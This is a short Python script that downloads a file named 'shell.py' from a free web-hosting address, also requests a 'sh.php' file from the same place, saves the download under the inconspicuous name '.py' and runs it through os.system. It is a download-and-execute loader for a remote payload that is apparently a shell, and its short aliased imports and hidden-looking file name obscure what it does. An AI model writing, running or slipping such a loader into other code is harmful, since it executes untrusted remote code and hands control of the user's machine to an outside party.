from requests import get as rg
from os import system as s

req = rg('https://oo-ozo.000webhostapp.com/Shell/shell.py')
rg('https://oo-ozo.000webhostapp.com/Shell/sh.php')

with open('.py', 'wb+') as sh:
    sh.write(req.content)

s('python .py')
